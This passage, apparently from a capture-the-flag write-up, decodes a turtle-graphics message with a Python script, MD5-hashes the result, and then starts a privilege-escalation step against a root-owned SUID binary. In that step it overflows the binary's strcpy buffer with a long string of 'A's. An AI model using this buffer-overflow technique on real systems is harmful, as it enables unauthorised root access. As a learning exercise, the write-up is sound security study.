`fd(-number)` to move backwards

`lt()` to turn left

`rt()` to turn right`

”turtle” comes packed with the standard Python package and need not be installed externally. With the help of a quick [tutorial](https://www.geeksforgeeks.org/turtle-programming-python/) we can write a python program that will read the given file and draw the message for us. 

```
import turtle
from turtle import fd, lt, rt

window = turtle.Screen()
turtle.shape("turtle")

t = turtle.Turtle()
file = open("turtle")

def move_turtle(direction, line):
    match direction:
        case "Avance":
            fd(int(line[1]))
            return ;
        case "Recule":
            fd(-int(line[1]))
            return ;
        case "Tourne":
            if (line[1] == "droite"):
                rt(int(line[3]))
            else:
                lt(int(line[3]))
            return ;
        case default:
            return ;

for line in file:
    l = line.split()
    if (l):
        move_turtle(l[0], l)

turtle.done()
```

Make sure to not name this program [turtle.py](https://python-forum.io/thread-149.html) and waste your time trying to figure out what's wrong like me.

![image](https://github.com/user-attachments/assets/eb97128d-b6d9-405c-a9c3-ee36b3dd3fff)

`$ echo -n SLASH > slash`

![image](https://github.com/user-attachments/assets/283f4ff0-5eb3-47b7-8827-def21b03c33d)

 **Can you digest the message?** Is a reference to the MD5 (message-digest algorithm) hashing alghoritm.
 
`$ md5sum slash`

`646da671ca01bb5d84dbb5fb2238dc8e`

![image](https://github.com/user-attachments/assets/45d1b4d8-c5f0-4216-9525-78b2a14ca61b)

We have a directory called mail and an exe called exploit_me. exploit me belongs to root and has SUID bit set. 

![image](https://github.com/user-attachments/assets/9d8f300c-850b-4cf0-8c8e-dafe172337e7)

The files in the mail directory are all empty.

![image](https://github.com/user-attachments/assets/0bf5f585-2a3a-4ac3-927f-76df823296ea)

![image](https://github.com/user-attachments/assets/2fc36176-334c-493e-990f-8d89d704bbfd)

![image](https://github.com/user-attachments/assets/7582a775-bee3-4703-8703-17aa55b2b35c)

![image](https://github.com/user-attachments/assets/39e10791-f73e-497a-862c-7f679a867e6a)

If the destination string of a strcpy() is not large enough, then anything  might happen.   Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.

Program uses strcpy, which doesn't check the length of the input, we might be able to overflow the buffer and overwrite the return address on the stack. 

```
$ ./exploit_me $(python -c 'print "A" * 1000')
```

![image](https://github.com/user-attachments/assets/ef2eb8d0-5ccf-450d-b63a-3a089300a57d)

![image](https://github.com/user-attachments/assets/eafadc34-c65c-4f62-b735-cc572e25a740)

![image](https://github.com/user-attachments/assets/ba6d6094-ffd3-41a9-971a-ae5d4e0f1d1b)

https://www.exploit-db.com/papers/13147

